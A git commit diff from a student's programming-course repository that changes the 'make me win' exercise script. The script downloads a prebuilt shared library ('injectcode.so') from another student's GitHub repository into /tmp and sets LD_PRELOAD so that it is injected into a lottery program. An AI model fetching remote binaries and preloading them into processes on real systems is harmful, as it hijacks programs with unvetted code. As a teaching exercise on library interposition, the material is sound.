2df563c372a551e04023bbda67cdeb6f1ba95a2e
Natnael-Gedlu <nategd800@gmail.com>
2023-08-25 17:28:41 +0300

    101-make_me_win.sh

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp https://github.com/Natnael-Gedlu/alx-low_level_programming/blob/master/0x18-dynamic_libraries/gigamillions.so
-export LD_PRELOAD=/tmp/gigamillions.so
+wget -P /tmp https://github.com/Karenahv/holbertonschool-low_level_programming/raw/master/0x18-dynamic_libraries/injectcode.so
+export LD_PRELOAD=/tmp/injectcode.so
